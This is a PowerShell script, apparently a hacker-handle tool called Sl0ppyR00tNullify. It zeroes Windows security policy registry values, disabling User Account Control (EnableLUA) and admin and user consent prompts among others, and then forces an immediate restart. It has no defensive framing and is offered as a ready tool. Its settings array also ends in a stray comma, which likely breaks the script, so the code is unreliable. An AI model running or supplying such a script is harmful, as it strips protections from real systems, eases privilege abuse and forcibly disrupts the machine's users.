# Sl0ppyR00tNullify.ps1
#
# AUTHOR : P.Hoogeveen
# AKA    : x0xr00t 
# BUILD  : 31102021
# TOOL   : Change LUA

function Nullify-RegistrySetting {
    param (
        [string]$RegistryPath,
        [string]$SettingName
    )

    Write-Host "Nullifying $SettingName..."
    $val = Get-ItemProperty -Path $RegistryPath -Name $SettingName -ErrorAction SilentlyContinue
    if ($null -eq $val) {
        Write-Host "Setting $SettingName not found in registry path $RegistryPath."
        return
    }
    
    if ($val.$SettingName -ne 0) {
        Set-ItemProperty -Path $RegistryPath -Name $SettingName -Value 0
    }
    
    Get-ItemProperty -Path $RegistryPath -Name $SettingName
    Write-Host "Successfully nullified $SettingName"
}

function Display-Header {
    Write-Host "000000000000slo0ppyr00t000000000000"
    Write-Host "0 Sl0ppyR00tNullify Lua Settings  0"
    Write-Host "000000000000slo0ppyr00t000000000000"
    Write-Host ""
    Write-Host ""
}

Display-Header
Write-Host "{Sl0ppyR00t} Getting LUA Settings...."
Start-Sleep -Seconds 4
Write-Host ""
Write-Host "{Sl0ppyR00t} Initializing..."
Write-Host ""

$RegistryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system"

# List of registry settings to nullify
$RegistrySettings = @(
    "EnableLUA",
    "ConsentPromptBehaviorAdmin",
    "ConsentPromptBehaviorUser",
    "SupportFullTrustStartupTasks",
    "LocalAccountTokenFilterPolicy",
    "shutdownwithoutlogon",
    # Add more registry settings here as needed
)

# Nullify settings
foreach ($setting in $RegistrySettings) {
    Nullify-RegistrySetting -RegistryPath $RegistryPath -SettingName $setting
    Start-Sleep -Seconds 5
}

Display-Header
Write-Host "Getting LUA Settings"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system
Start-Sleep -Seconds 10

Display-Header
Write-Host "Restarting System (Forced)..."
Restart-Computer -Force
